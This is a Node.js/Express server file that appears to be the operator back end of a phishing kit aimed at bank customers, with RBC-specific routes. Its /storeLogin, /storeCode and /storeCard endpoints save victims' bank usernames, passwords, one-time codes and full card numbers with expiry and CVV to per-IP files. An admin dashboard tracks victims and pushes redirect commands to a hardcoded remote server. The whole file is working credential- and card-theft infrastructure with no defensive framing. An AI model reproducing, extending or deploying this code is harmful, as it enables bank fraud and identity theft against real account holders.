// 1. Constants and Requires
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');
const axios = require('axios')

// 2. App and Server Initialization
const appB = express();
const serverB = http.createServer(appB);
const ioB = socketIo(serverB);

// 3. Constants
const SERVER_A = "http://172.86.123.119:3000";
const PORT_B = 4000;

// 4. Middleware
appB.use(bodyParser.json());
appB.use(bodyParser.urlencoded({ extended: true }));
appB.use(express.static('public'));
appB.set('view engine', 'ejs');
appB.set('views', path.join(__dirname, 'views'));

// 5.Data Structure
const usersMap = new Map();

// Read data from JSON file and initialize the usersMap
if (fs.existsSync('userData.json')) {
    const usersData = JSON.parse(fs.readFileSync('userData.json', 'utf8'));
    for (const [key, value] of usersData) {
        usersMap.set(key, value);
    }
}

// 6. Socket Events
ioB.on('connection', (socket) => {
    // Send the current state of usersMap to the newly connected admin client
    socket.emit('updateTable', Array.from(usersMap.values()));

    socket.on('redirectUser', (data) => {
        //console.log(data)
        axios.post(`${SERVER_A}/userRedirect`, data);
    });

});



// 7. Routes
appB.post('/updateUser', (req, res) => {
    let users = req.body;

    for (let user of users) {
        if (usersMap.has(user.ip)) {
            // User with this IP exists, so update their other attributes
            const existingUser = usersMap.get(user.ip);
            Object.assign(existingUser, user);
            usersMap.set(user.ip, existingUser);
        } else {
            // User with this IP doesn't exist, add them to the map
            usersMap.set(user.ip, user);
        }
    }

    // Emitting to the frontend
    ioB.emit('updateTable', Array.from(usersMap.values()));

    // Save the updated usersMap to a JSON file
    fs.writeFileSync('userData.json', JSON.stringify(Array.from(usersMap.entries())));
});

appB.post('/storeLogin', (req, res) => {
    const data = `\n|============ ${req.body.banks} Login ===========|\n|Username: ${req.body.username}\n|Password: ${req.body.password}\n\n|IP: ${req.body.ip}\n|UserAgent: ${req.body.userAgent}\n`;
    fs.appendFile(`data/${req.body.ip}`, data, (err) => {
        if (err) throw err;
        console.log('Data saved!');
        res.status(200).send('Data stored successfully');
    });
});

appB.post('/storeCode', (req, res) => {
    const data = `\n|============ OTP ===========|\n|OTP:${req.body.code}\n`;
    fs.appendFile(`data/${req.body.ip}`, data, (err) => {
        if (err) throw err;
        console.log('Data saved!');
        res.status(200).send('Data stored successfully');
    });
});

appB.post('/storeCard', (req, res) => {
    const data = `\n|============ Card ===========|\n|Card number:${req.body.card}\n|MM:${req.body.exp1}\n|YY:${req.body.exp2}\n|CVV:${req.body.cvv}\n`;
    fs.appendFile(`data/${req.body.ip}`, data, (err) => {
        if (err) throw err;
        console.log('Data saved!');
        res.status(200).send('Data stored successfully');
    });
});

// Admin route
appB.get('/admin', (req, res) => {
    const users = Array.from(usersMap.values());
    res.render('admin', { users });
});

// Admin route
appB.get('/', (req, res) => {
    res.render('index');
});

// RBC Routes
appB.use('/rbc', require('./routes/rbc'));

// 8.Server Startup
serverB.listen(PORT_B, () => console.log(`Dashboard server is running on http://localhost:${PORT_B}`));